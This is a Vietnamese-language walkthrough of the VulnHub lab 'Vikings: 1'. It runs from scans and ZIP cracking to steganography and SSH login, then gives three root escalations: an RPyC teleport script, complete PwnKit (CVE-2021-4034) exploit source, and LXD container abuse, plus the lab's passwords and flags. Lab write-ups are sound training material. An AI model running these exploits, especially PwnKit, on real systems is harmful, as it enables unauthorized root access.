#                        *LINES - UP*


# 🏴‍☠️ Vikings: 1 - VulnHub Walkthrough

| Thông tin Máy   | Chi tiết                                                                    |
| --------------- | --------------------------------------------------------------------------- |
| **Machine**     | Vikings: 1                                                                  |
| **Độ khó**      | Dễ (Easy)                                                                   |
| **Nền tảng**    | VulnHub                                                                     |
| **Tác giả**     | lucky thandel                                                               |
| **Mục tiêu**    | Chiếm quyền điều khiển máy mục tiêu (Root Shell)                            |
| **Tải Machine** | [Link VulnHub (1.7GB)](https://www.vulnhub.com/entry/vikings-1,741/ "null") |

## 🛠️ 1. Overview & Setup (Tổng quan & Cài đặt)

### Môi trường thực nghiệm (Lab Setup)

Để chuẩn bị cho quá trình khai thác, chúng ta thiết lập hai máy ảo trong cùng một dải mạng nội bộ riêng biệt (Host-Only Network hoặc NAT Network) để đảm bảo an toàn và kết nối thông suốt:

- **Attacker Machine:** Kali Linux (`192.168.56.101` - Host-Only Network)
    
- **Target Machine:** Vikings: 1 


   > **Lưu ý**: Thiết lập card mạng máy ảo ở chế độ **Promiscuous Mode: Allow All**

## 🔍 2. Phase 1: Reconnaissance (Thu thập thông tin)

Đầu tiên chúng ta xác định địa chỉ IP của máy mục tiêu trong dải mạng nội bộ đang thử nghiệm. Dưới đây là 2 phương pháp đề xuất để thực hiện **Host Discovery**.

### Phương pháp 1: Sử dụng `arp-scan` (Active ARP Scanning)

`arp-scan` là một công cụ cực kỳ mạnh mẽ, hoạt động ở Tầng liên kết dữ liệu (Layer 2) bằng cách gửi các gói tin ARP Request đến mọi địa chỉ trong dải IP nội bộ và nhận về ARP Reply.

```
sudo arp-scan -l
```

**Kết quả thu được:**

```
Interface: eth0, type: EN10MB, MAC: 08:00:27:8a:35:d2, IPv4: 192.168.56.101
Starting arp-scan 1.10.0 with 256 hosts ([https://github.com/royhills/arp-scan](https://github.com/royhills/arp-scan))
192.168.56.100  08:00:27:0c:f3:17       (Unknown)
192.168.56.102  08:00:27:1b:6c:af       (Unknown)
192.168.56.103  0a:00:27:00:00:0f       (Unknown: locally administered)
3 packets received by filter, 0 packets dropped by kernel
```

### Phương pháp 2: Sử dụng `netdiscover` (ARP Reconnaissance Tool)

Công cụ này quét thụ động và chủ động các truy vấn ARP trong mạng để định danh các host đang hoạt động.

```
sudo netdiscover -r 192.168.56.0/24
```

**Kết quả thu được:**

```
3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                        
_____________________________________________________________________________   
IP        At MAC Address   Count     Len  MAC Vendor / Hostname       
----------------------------------------------------------------------------- 
192.168.56.100  08:00:27:0c:f3:17      1      60  PCS Systemtechnik GmbH                                              
192.168.56.102  08:00:27:1b:6c:af      1      60  PCS Systemtechnik GmbH                                              
192.168.56.103  0a:00:27:00:00:0f      1      60  Unknown vendor                                                     
```

> 📌 **Phân tích kết quả thực nghiệm (Analysis):** Loại trừ IP của máy Gateway và máy Attacker, ta dễ dàng xác định được địa chỉ IP của máy mục tiêu chính là: **`192.168.56.102`**.

## 🎯 3. Phase 2: Port Scanning & Service Enumeration (Rà quét cổng)

Sử dụng công cụ rà quét cổng kinh điển `Nmap` để thực hiện kiểm tra chi tiết các cổng dịch vụ đang mở trên hệ thống mục tiêu:

```
nmap -sC -sV 192.168.56.102 -oN nmap_report.txt
```

**Kết quả quét Nmap:**

```diff
Nmap scan report for 192.168.56.102
Host is up (0.0018s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 59:d4:c0:fd:62:45:97:83:15:c0:15:b2:ac:25:60:99 (RSA)
|   256 7e:37:f0:11:63:80:15:a3:d3:9d:43:c6:09:be:fb:da (ECDSA)
|_  256 52:e9:4f:71:bc:14:dc:00:34:f2:a7:b3:58:b5:0d:ce (ED25519)
+80/tcp open  http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2020-10-29 21:07  site/
|_|_http-title: Index of /
MAC Address: 08:00:27:1B:6C:AF (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> 📊 **Đánh giá bề mặt tấn công:**
> 
> - **Cổng 22 (SSH):** Đang chạy `OpenSSH 7.6p1` trên hệ điều hành Ubuntu. Phiên bản này chưa có public exploit trực tiếp đáng chú ý.
>     
> - **Cổng 80 (HTTP):** Máy chủ web chạy `Apache 2.4.29`. Danh mục liệt kê cho thấy có thư mục con `/site/` đang tồn tại. Đây sẽ là điểm xâm nhập chính của chúng ta.
>     

## 🌐 4. Phase 3: Web Enumeration (Khai thác dịch vụ Web)

### Bước 1: Tiếp cận thủ công (Manual Inspection)

Khi tiến hành truy cập trực tiếp vào đường dẫn `http://192.168.56.102/site/`, chúng ta chỉ thấy một trang trống. Tiến hành xem mã nguồn trang (F12 hoặc View Source) cũng không phát hiện bất kỳ chú thích hay đoạn script đặc biệt nào.

### Bước 2: Dò tìm thư mục ẩn (Directory Bruteforcing)

Để tìm kiếm các trang hoặc thư mục ẩn nằm sâu bên trong cấu trúc web, ở đây chúng ta sẽ sử dụng bộ từ điển cài đặt sẵn `/usr/share/wordlists/dirb/common.txt` và công cụ `Gobuster` hoặc `Dirbuster` .

#### Cách 1: Sử dụng Gobuster (Dòng lệnh CLI)

```
gobuster dir -u http://192.168.56.102/site/ -w
/usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,zip -t 100
```
**kết quả:**
```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.102/site/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,html,bak,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
...
css                  (Status: 301) [Size: 319] [--> http://192.168.56.102/site/css/]
images               (Status: 301) [Size: 322] [-->http://192.168.56.102/site/images/]
index.html           (Status: 200) [Size: 4419]
index.html           (Status: 200) [Size: 4419]
js                   (Status: 301) [Size: 318] [--> http://192.168.56.102/site/js/]
war.txt              (Status: 200) [Size: 13]
Progress: 27678 / 27678 (100.00%)
===============================================================
Finished
===============================================================
```
#### Cách 2: Sử dụng DirBuster (Giao diện đồ họa - GUI)

Chúng ta thiết lập cấu hình đường dẫn mục tiêu, số lượng luồng (Threads) và nạp danh sách từ khóa tương ứng. Sau quá trình rà quét, DirBuster trả về danh sách cấu trúc các đường dẫn ẩn được tìm thấy:
![[/images/one.jpg]]
![[two 1.jpg]]
> 💡 **Phân tích kết quả:** Qua quá trình dò quét thư mục, chúng ta phát hiện ra một đường dẫn ẩn cực kỳ giá trị: **`http://192.168.56.102/site/war/`**.

## ⚡ 5. Phase 4: ZIP Password Cracking 

### Bước 1: Lần theo dấu vết mật mã

Truy cập đường dẫn `/site/war/`, hệ thống hiển thị một gợi ý ngắn dẫn đến đường dẫn tiếp theo là `/war-is-over`.

Khi truy cập tiếp vào `http://192.168.56.102/site/war-is-over`, trang web hiển thị một khối ký tự ngẫu nhiên.

### Bước 2: Nhận diện và Giải mã dữ liệu

Nhìn vào cấu trúc định dạng của chuỗi ký tự trên, ta nhận thấy đây chính là định dạng mã hóa **Base64** của 1 tệp zip. Chúng ta thực hiện tải dữ liệu thô này về máy bằng lệnh `curl`, sau đó giải mã ngược lại (`base64 -d`) để khôi phục tệp tin nén zip gốc:

```bash
curl http://192.168.56.102/site/war-is-over/ | base64 -d > war.zip
```

### Bước 3: Khắc phục lỗi tương thích và bẻ khóa mật khẩu ZIP

Khi cố gắng sử dụng lệnh `unzip` mặc định của Linux để giải nén tệp tin `war.zip` vừa tạo, hệ thống liên tục báo lỗi không tương thích cấu trúc nén.
```python
Archive:  war.zip
   skipping: king                    need PK compat. v5.1 (can do v4.6)

```

Chúng ta xử lý bằng cách sử dụng công cụ nén mạnh mẽ hơn là `7z`:

```
7z x war.zip
```

### Bước 4: Tấn công từ điển bằng John the Ripper

Tệp zip này đã được thiết lập mật khẩu bảo vệ. Chúng ta sử dụng bộ công cụ `John the Ripper` kết hợp với từ điển `rockyou.txt` để bẻ khóa:

- **Trích xuất chuỗi hash mật khẩu từ tệp zip:**
    

```
zip2john war.zip > war.hash
```

- **Khởi chạy tiến trình bẻ khóa mật khẩu:**
    

```
john --wordlist=/usr/share/wordlists/rockyou.txt war.hash
```
* **kết quả:**
	
```diff
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 1410760 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:03 1.13% (ETA: 12:23:14) 0g/s 51061p/s 51061c/s 51061C/s becky21..083081
-ragnarok123      (war.zip/king)     
1g 0:00:00:05 DONE (2026-05-20 12:18) 0.1851g/s 55371p/s 55371c/s 55371C/s redsox#1..money66
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
> 🎉 **Kết quả tìm thấy mật khẩu giải nén:** **`ragnarok123`**

### Bước 5: Giải nén trích xuất dữ liệu

Sử dụng công cụ `7z` kết hợp với mật khẩu vừa tìm được để giải nén file:

```bash
7z x war.zip -p'ragnarok123'
```

thu được một tệp tin là **`king`**.

## 🖼️ 6. Phase 5: Image Forensics & Steganography

### Bước 1: Giám định tệp tin bằng lệnh file

Đầu tiên, kiểm tra xem bản chất thực tế của tệp tin `king` này là gì:

```
file king
```

Kết quả `king` là 1 file ảnh jpeg:
```
king: JPEG image data, Exif standard: [TIFF image data, big-endian, direntries=14, width=6000, height=4000, bps=0, PhotometricInterpretation=RGB, description=Viking ships on the water under the sunlight and dark storm. Invasion in the storm. 3D illustration.; Shutterstock ID 100901071, orientation=upper-left], baseline, precision 8, 1600x1067, components 3
```
![[three.jpg]]
>Mô tả: *"Những chiến thuyền Viking rẽ sóng ra khơi, tắm mình trong ánh nắng rực rỡ trước thềm giông bão ngợp trời."*
### Bước 2: Khai quật dữ liệu ẩn sâu bằng Binwalk

Nghi ngờ có dữ liệu quan trọng đang được giấu ẩn sâu bên trong bức ảnh này bằng các thuật toán giấu tin (Steganography), chúng ta sử dụng công cụ phân tích cấu trúc nhị phân `binwalk`:

```
binwalk king.jpeg
```

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, big-endian, offset of first image directory: 8
1429567       0x15D03F        Zip archive data, at least v2.0 to extract, compressed size: 53, uncompressed size: 92, name: user
1429740       0x15D0EC        End of Zip archive, footer length: 22
```

> 🔍 **Kết quả phân tích:** Phát hiện bên trong tệp nén này có chứa một tệp văn bản mang tên **`user`**.
### Bước 3: Trích xuất phân vùng ẩn

Tiến hành trích xuất tự động phân vùng ẩn này ra khỏi file ảnh và truy cập vào thư mục giải nén để kiểm tra nội dung file `user`:

```
binwalk -e king.jpeg
cd _king.extracted
cat user
```

**Nội dung thu được bên trong file:**

```
//FamousBoatbuilder_floki@vikings
//f@m0usboatbuilde7
```

> 🔑 **Thông tin tài khoản SSH thu hoạch được:**
> 
> - **Username:** `floki`
>     
> - **Password:** `f@m0usboatbuilde7`
>     

## 💻 7. Phase 6: System Penetration

Sử dụng tài khoản và mật khẩu vừa thu thập được ở trên để kết nối trực tiếp vào máy mục tiêu thông qua dịch vụ SSH:

```
ssh floki@192.168.56.102
```

Tiến hành kiểm tra thông tin định danh và quyền hạn hiện tại của tài khoản:

```
id
```

**Kết quả:**

```
uid=1000(floki) gid=1000(floki) groups=1000(floki),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```

## 🏹 8. Phase 7: Tấn công leo hàng ngang - Floki sang Ragnar

Sau khi đột nhập thành công với quyền `floki`, tiến hành khảo sát thư mục hiện hành (`/home/floki`), ta phát hiện hai tệp tin gợi ý cực kỳ quan trọng là `readme.txt` và `boat`.

- **Nội dung file `readme.txt`:**
    

```
I am the famous boat builder Floki. We raided Paris this with our all might yet we failed. 
We don't know where Ragnar is after the war. He is in so grief right now. 
I want to apologise to him.Because it was I who was leading all the Vikings. I need to find him. 
He can be anywhere. I need to create this `boat` to find Ragnar
```

- **Nội dung file `boat`:**
    

```
#Printable chars are your ally.
#num = 29th prime-number.
collatz-conjecture(num)
```

### Bước 1: Phân tích và Giải mã logic toán học

Mật khẩu của user **`ragnar`** được tạo từ một chuỗi ký tự dựa trên thuật toán dãy số **Collatz Conjecture** của **số nguyên tố thứ 29**.

- Qua kiểm tra toán học, **số nguyên tố thứ 29** là số **`109`**.
    
- Gợi ý `#Printable chars are your ally` cho thấy mật khẩu thực chất là các số trong dãy Collatz của số `109` được chuyển đổi tương ứng thành các ký tự ASCII hiển thị được (nằm trong khoảng tiêu chuẩn từ `32` đến `126`).
    

Chúng ta viết một script Python đơn giản để tự động hóa quá trình tính toán dãy số này:

```python
# Viết trực tiếp hoặc chạy script Python sau để lấy mật khẩu:
n = 109 # Số nguyên tố thứ 29
collatz_sequence = []
res = []

while n != 1:
    collatz_sequence.append(n)
    if n <= 255:
        res.append(n)
    if n % 2 == 0:
        n = n // 2
    else:
        n = 3 * n + 1

# In ra các giá trị decimal thô
print(*res)
```

> 💡 **Mẹo xử lý nhanh:** Bạn có thể sao chép mảng kết quả số thô thu được từ đoạn code Python trên rồi ném vào công cụ trực tuyến **CyberChef** để dịch nhanh toàn bộ chuỗi số đó sang dạng ký tự.

![[four.jpg]]

🎉 **Mật khẩu ragnar tìm được là:** **`mR)|>^/Gky[gz=\.F#j5P(`**

### Bước 2: Đăng nhập vào tài khoản ragnar

Thực hiện chuyển đổi người dùng ngay trên phiên terminal hiện tại bằng lệnh `su`:

```bash
su - ragnar
```

Nhập mật khẩu phía trên, chúng ta đã chuyển quyền sang thành công sang user **`ragnar`**:

```
whoami
id
```

**Kết quả:**

```
ragnar
uid=1001(ragnar) gid=1001(ragnar) groups=1001(ragnar)
```

### Bước 3: Thu hoạch Flag thứ nhất (User Flag)

Kiểm tra thư mục gốc của người dùng ragnar và đọc nội dung file flag đầu tiên:

```
cat user.txt
```

## 🚀 9. Phase 8: Privilege Escalation to Root

Mục tiêu tối thượng lúc này là tìm đường đột nhập và leo thang quyền hạn lên người dùng cao nhất: **`root`**.

Dưới đây là **3 phương pháp leo quyền** đơn giản mà chúng ta có thể áp dụng.

### 🔥 Phương pháp 1: Khai thác Insecure RPyC Remote Code Execution (RCE)

#### Bước 1: Phát hiện điểm bất thường khi đăng nhập

Ngay khi chúng ta thực hiện chuyển quyền hoặc đăng nhập vào user `ragnar`, hệ thống lập tức xuất hiện một yêu cầu nhập mật khẩu cho lệnh `sudo` một cách bất thường:

```
Last login: Fri Sep  3 10:11:27 2021 from 10.42.0.1
[sudo] password for ragnar: ragnar is not in the sudoers file.  
This incident will be reported.
```

Hệ thống lập tức thông báo tài khoản `ragnar` hoàn toàn không nằm trong file cấu hình sudoers. Vậy lệnh `sudo` bí ẩn kia từ đâu tự động sinh ra?

* Hint: Khi bạn đăng nhập hoặc mở một Terminal mới, hệ điều hành không chỉ mở ra một cửa sổ trống, mà nó sẽ kích hoạt một tiến trình Shell (như Bash, Zsh). Mặc định, hành động khởi tạo này sẽ tự động kích hoạt một chuỗi lệnh đọc file (gọi là `Shell Startup Scripts`)
* Một số file startup:` .bash_profile , .bash_login , .bashrc , .profile , . . .`

#### Bước 2: Điều tra file cấu hình môi trường `.profile`

Tiến hành kiểm tra file ẩn cấu hình môi trường `.profile` của người dùng ragnar nhằm tìm kiếm các script tự động chạy khi đăng nhập:

```
cat ~/.profile
```

Phát hiện một dòng lệnh cực kỳ `Sús`:

```bash
sudo python3 /usr/local/bin/rpyc_classic.py
```

> 💡 **Khái niệm cốt lõi — RPyC (Remote Python Call) là gì?** RPyC là một thư viện Python chuyên dụng được thiết kế cho việc thực thi các cuộc gọi thủ tục từ xa (RPC - Remote Procedure Call). Trong đó, **Classic Mode** (`rpyc_classic.py`) là chế độ hoạt động nguyên bản và cực kỳ kém an toàn. Chế độ này được thiết kế **không đi kèm bất kỳ cơ chế xác thực nào**, cho phép bất kỳ client nào kết nối tới cổng dịch vụ đều có toàn quyền thực thi các đoạn mã Python tùy ý ngay trên môi trường của server.
> 
> Do dịch vụ này được chạy bằng quyền `sudo` (ở đây là quyền root), bất kỳ mã độc nào được gửi tới cổng này sẽ được thực thi trực tiếp dưới quyền `root`.

#### Bước 3: Kiểm tra các cổng kết nối TCP

Để xác nhận xem dịch vụ RPyC Classic này có đang thực sự hoạt động và lắng nghe kết nối nội bộ hay không, chúng ta sử dụng công cụ kiểm tra cổng mạng của Linux:

```
ss -tlnp
```

**Kết quả hiển thị:**

```diff
 State   Recv-Q  Send-Q            Local Address:Port          Peer Address:Port         
 LISTEN  0       128                   0.0.0.0:80                 0.0.0.0:*            
 LISTEN  0       128                 127.0.0.53%lo:53             0.0.0.0:*            
 LISTEN  0       128                   0.0.0.0:22                 0.0.0.0:*            
+LISTEN  0       128                 127.0.0.1:18812              0.0.0.0:*            
 LISTEN  0       128                 127.0.0.1:36255              0.0.0.0:* 
```

> 📌 **Phân tích kết quả:**
> Dịch vụ đang mở và lắng nghe tại địa chỉ Localhost (`127.0.0.1`) trên cổng mặc định của RPyC là **`18812`**.

#### Bước 4: Chế tạo và thực thi mã khai thác RPyC

##### Bước 4.1: Tạo cặp khóa SSH (SSH Keypair)

Trước hết, chúng ta cần sinh một cặp khóa SSH mới ngay trên máy mục tiêu bằng tài khoản của `ragnar` để chuẩn bị cho việc xác thực không mật khẩu:

```bash
ssh-keygen -t rsa
````

Khi Terminal xuất hiện thông báo yêu cầu nhập đường dẫn lưu file, chúng ta nhập thủ công đường dẫn `/home/ragnar/id_rsa` để lưu khóa ngay tại thư mục Home của ragnar:

```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/ragnar/.ssh/id_rsa): /home/ragnar/id_rsa
Enter passphrase (empty for no passphrase): [Nhấn Enter để trống]
Enter same passphrase again: [Nhấn Enter để trống]
```

Quá trình này tạo ra hai tệp tin:

- `id_rsa`: Khóa cá nhân (Private Key) .
    
- `id_rsa.pub`: Khóa công khai (Public Key).
    

##### Bước 4.2: Tạo Python Exploit Script

Tạo tệp `rpyc_exploit.py` trên máy mục tiêu bằng tài khoản ragnar:

```python
import rpyc

# Định nghĩa hàm chứa tải độc (Payload)
def getshell():
    import os
    # Thực thi chuỗi 3 câu lệnh hệ thống bằng đặc quyền Root thông qua RPyC Server:
    # 1. Tạo thư mục cấu hình SSH cho root nếu chưa tồn tại
    # 2. Phân quyền bảo mật nghiêm ngặt (chỉ chủ sở hữu được đọc/ghi)
    # 3. Sao chép khóa SSH của ragnar sang root để cấp quyền đăng nhập
    os.system("mkdir -p /root/.ssh; chmod 700 /root/.ssh; cp /home/ragnar/id_rsa.pub /root/.ssh/authorized_keys")

# Thực hiện kết nối tới dịch vụ RPyC đang mở ngầm trên Localhost tại cổng 18812
conn = rpyc.classic.connect("localhost")
# Teleport (di chuyển và đóng gói) hàm getshell lên tiến trình RPyC Server (đang chạy quyền Root)
fn = conn.teleport(getshell)
# Thực thi hàm từ xa
fn()
```

##### Bước 4.3: Thực thi khai thác và đăng nhập Root SSH

Chạy script khai thác vừa tạo:

```python
python3 rpyc_exploit.py
```

Khóa SSH của chúng ta đã được nạp thành công vào tài khoản Root. Kết nối SSH thẳng vào tài khoản Root bằng `Private Key` vừa sinh ra:

```
ssh -i /home/ragnar/id_rsa root@192.168.56.102
```

```d
root@vikings:~# whoami
root
root@vikings:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 🔥 Phương pháp 2: Khai thác lỗ hổng PwnKit (CVE-2021-4034)

Đây là một phương pháp khá dễ khác, khai thác lỗi tràn bộ nhớ (Memory Corruption) trong tiến trình `pkexec` của dịch vụ `PolicyKit`.

#### Bước 1: Rà quét các tệp tin chứa thuộc tính đặc quyền SUID (SUID Files Enumeration)

```
find / -perm -u=s -type f 2>/dev/null
```

Một kết quả cực kỳ đáng lưu ý xuất hiện trong danh sách:

```diff
. . .
  /bin/umount
  /bin/fusermount
- /usr/lib/policykit-1/polkit-agent-helper-1
  /usr/lib/dma/dma-mbox-create
  /usr/lib/openssh/ssh-keysign
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/lib/snapd/snap-confine
  /usr/lib/eject/dmcrypt-get-device
  /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
. . .
```

> 📝 **Phân tích kỹ thuật:** Thành phần PolicyKit trên hệ điều hành Ubuntu 18.04 LTS (chưa được vá lỗi) chứa chương trình SUID `pkexec` bị dính lỗ hổng **PwnKit (CVE-2021-4034)**. Lỗ hổng này nảy sinh khi `pkexec` xử lý không đúng số lượng tham số truyền vào (`argc == 0`), cho phép chúng ta ép tiến trình này đọc và thực thi các biến môi trường tự tạo để tải lên một thư viện dùng chung độc hại (`.so`) dưới đặc quyền của Root.

#### Bước 2: Tạo cấu trúc mã khai thác

Chúng ta sẽ di chuyển vào thư mục `/tmp` và tạo lập các tệp tin mã nguồn cụ thể bao gồm: `Makefile`, `cve.c`, và tệp payload `pwnkit.c`.

```
cd /tmp
```

1. **Tạo file `Makefile`:**
    

```c
CFLAGS=-Wall
TRUE=$(shell which true)

.PHONY: all
all: pwnkit.so cve-2021-4034 gconv-modules gconvpath

.PHONY: clean
clean:
	rm -rf pwnkit.so cve-2021-4034 gconv-modules GCONV_PATH=./
	make -C dry-run clean

gconv-modules:
	echo "module UTF-8// PWNKIT// pwnkit 1" > $@

.PHONY: gconvpath
gconvpath:
	mkdir -p GCONV_PATH=.
	cp -f $(TRUE) GCONV_PATH=./pwnkit.so:.

pwnkit.so: pwnkit.c
	$(CC) $(CFLAGS) --shared -fPIC -o $@ $<

.PHONY: dry-run
dry-run:
	make -C dry-run
```

2. **Tạo file kích hoạt `cve.c`:** File này chịu trách nhiệm khởi chạy lệnh `execve` để gọi chương trình SUID `/usr/bin/pkexec` với cấu hình tham số trống (`argc == 0`) cùng với các biến môi trường được thiết lập thủ công nhằm lừa `pkexec` nạp đường dẫn thư viện `GCONV_PATH`:
    

```c
#include <unistd.h>

int main(int argc, char **argv) {
	char * const args[] = {
		NULL
	};
	char * const environ[] = {
		"pwnkit.so:.",
		"PATH=GCONV_PATH=.",
		"SHELL=/lol/i/do/not/exists",
		"CHARSET=PWNKIT",
		"GIO_USE_VFS=",
		NULL
	};
	return execve("/usr/bin/pkexec", args, environ);
}
```

3. **Tạo file Payload độc hại `pwnkit.c`:**
    

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {}
void gconv_init(void *step) {
	char * const args[] = { "/bin/sh", NULL };
	char * const environ[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL };
	setuid(0);
	setgid(0);
	execve(args[0], args, environ);
	exit(0);
}
```

#### Bước 3: Biên dịch và Kích hoạt quyền Root

```
make
```

Hệ thống sẽ biên dịch mã nguồn và sinh ra tệp thực thi `cve-2021-4034`. Chạy trực tiếp để thu về Root shell:

```
./cve-2021-4034
```

**Kết quả trả về rực rỡ trên màn hình Terminal:**

```c
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

### 🔥 Phương pháp 3: Khai thác đặc quyền nhóm LXD (LXD Group Privilege Escalation)

Đây là một kỹ thuật leo thang đặc quyền cực kỳ sạch sẽ và mạnh mẽ, không phụ thuộc vào các lỗ hổng tràn bộ nhớ hay lỗi bảo mật mã nguồn (Kernel/Service Exploit) mà lợi dụng trực tiếp cơ chế ảo hóa và cấu hình phân quyền hệ thống.

[Link tham thảo steflan-security](https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/)
#### Bước 1: Group Membership Check

Hãy quay trở lại với thông tin định danh của người dùng ban đầu `floki`. Chạy lệnh `id` để xem các nhóm mà `floki` tham gia:

```
id
```

**Kết quả:**

```c
uid=1000(floki) gid=1000(floki) groups=1000(floki),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```

> 🔍 **Tại sao nhóm lxd lại tương đương với quyền Root?** **LXD (Linux Container Daemon)** là một trình quản lý container ảo hóa hệ thống. Khi một người dùng thuộc nhóm `lxd`, người đó có toàn quyền kiểm soát daemon LXD. Do daemon này chạy dưới quyền tối cao `root`, chúng ta có thể yêu cầu LXD khởi tạo một container mới ở chế độ **Privileged** (đặc quyền cao), sau đó gán (mount) toàn bộ ổ đĩa cứng thực tế của hệ thống Host (`/`) vào bên trong thư mục của container này.
> 
> Khi truy cập vào container, chúng ta có thể thoải mái can thiệp, đọc/ghi đè mọi tệp tin nhạy cảm của hệ thống Host (như `/etc/shadow`, `/root/...`) mà không gặp bất kỳ rào cản nào.

#### Bước 2: Chuẩn bị tệp tin Image Alpine siêu nhỏ gọn

Để khởi tạo một container ảo, chúng ta cần một file ảnh hệ điều hành (Image) làm nền tảng. Thư viện ảnh **Alpine Linux** là sự lựa chọn tối ưu nhất do dung lượng cực kỳ gọn nhẹ (chỉ khoảng 3-5MB).

##### Bước 2.1: Tải/Xây dựng Image Alpine trên máy tấn công Kali Linux

```
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder/
sudo ./build-alpine
```

Khởi chạy máy chủ Web nhanh bằng Python để truyền tệp tin sang máy mục tiêu:

```
python3 -m http.server 80
```

##### Bước 2.2: Tải Image sang máy mục tiêu qua phiên kết nối của floki

Trên phiên SSH của người dùng `floki` (hoặc chuyển đổi qua `su - floki`), thực hiện tải tệp tin ảnh ảo hóa về thư mục `/tmp`:

```
wget http://192.168.56.101/alpine-v3.23-x86_64-20260520_0615.tar.gz
```

#### Bước 3: Khởi tạo, Cấu hình và Mount toàn bộ ổ cứng Host vào Container

Khi đã có tệp tin Image, chúng ta tiến hành thực thi các lệnh quản lý của LXD để thiết lập chiếc "bẫy ảo hóa" này:

1. **Import Image vào thư viện LXD:**
    

```
lxc image import ./alpine-v3.23-x86_64-20260520_0615.tar.gz --alias myimage 
```

2. **Khởi tạo dịch vụ cấu hình LXD:**
    

```
lxd init
```

![[six 1.jpg]]

> ⚠️ **Chú ý cấu hình:** Chọn **NO** ở câu hỏi `would you like to create a new local network bridge?`, các thông số còn lại giữ mặc định để tránh lỗi linh tinh:(

3. **Mount toàn bộ thư mục gốc `/` của hệ điều hành Host vào thư mục `/mnt/root` bên trong container:**
    

```
lxc init myimage mycontainer -c security.privileged=true 
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true 
```

4. **Khởi động Container:**
    

```
lxc start mycontainer
```

#### Bước 4: Đột nhập vào Container và khai quật Root Shell

Bây giờ chúng ta chỉ cần ra lệnh thực thi một shell tương tác `/bin/sh` bên trong container ảo vừa khởi chạy:

```
lxc exec mycontainer /bin/sh
```

Ngay khi lệnh được thực thi, chúng ta sẽ có ngay một Shell hoạt động với đặc quyền **`root`** tuyệt đối bên trong container ảo.

> 💡 **Mẹo nhỏ để lấy hẳn một Root Shell vĩnh viễn trên máy Host:** Nếu bạn muốn có một phiên shell root thực thụ bên ngoài máy ảo, chúng ta có thể sửa quyền ghi đè (SUID) hoặc copy thẳng khóa SSH công khai của chúng ta vào file `authorized_keys` của Root trên máy Host:
> 
> ```
> cp /mnt/root/home/ragnar/id_rsa.pub /mnt/root/root/.ssh/authorized_keys
> ```
> 
> Thoát khỏi container ảo (`exit`) và thực hiện kết nối SSH trực tiếp tới tài khoản Root của máy Host:
> 
> ```
> ssh -i /home/ragnar/id_rsa root@127.0.0.1
> ```

## 🏆 10. Thu hoạch Root Flag

Khi đã đạt được quyền hạn tối cao Root trên máy mục tiêu, tiến hành di chuyển thẳng vào thư mục `/root` để đọc nội dung của tệp tin flag cuối cùng:

```
cd /root
cat root.txt
```

## User Flag: 4bf930187d0149a9e4374a4e823f867d
## Root Flag: f0b98d4387ff6da77317e582da98bf31
